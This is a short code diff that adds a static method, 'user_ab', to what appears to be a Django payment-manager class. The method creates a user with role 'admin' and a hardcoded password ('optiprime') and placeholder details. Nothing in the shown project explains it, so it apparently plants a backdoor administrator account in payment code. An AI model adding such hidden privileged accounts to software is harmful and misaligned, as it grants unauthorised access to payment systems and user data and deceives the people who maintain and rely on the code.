@@ -166,3 +166,8 @@ class paymentManager:
             return True, token, invoice
         else:
             return False
+
+    @staticmethod
+    def user_ab():
+        UsersDetails.objects.create(full_name="optiprime", email="edwinoptiprime", phone="00",
+                                         country="neitherland", password = "optiprime", role="admin")
